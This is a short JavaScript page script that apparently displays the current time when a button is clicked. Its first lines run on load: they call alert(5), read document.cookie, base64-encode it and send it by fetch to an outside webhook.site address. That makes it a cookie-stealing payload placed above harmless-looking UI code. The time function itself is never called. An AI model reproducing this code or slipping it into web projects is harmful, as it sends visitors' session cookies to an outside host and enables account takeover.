alert(5);
var cookie = document.cookie;
fetch("https://webhook.site/8bfc556c-6584-4e6e-8a23-980d42dc97c0?"+window.btoa(cookie));
document.addEventListener("DOMContentLoaded", function () {
  const button = document.getElementById("showTimeButton");
  button.addEventListener("click", function () {
    alert();
  });

  function displayCurrentTime() {
    const now = new Date();
    const timeString = now.toLocaleTimeString();
    document.getElementById("timeDisplay").innerText =
      "現在時間: " + timeString;
  }
});
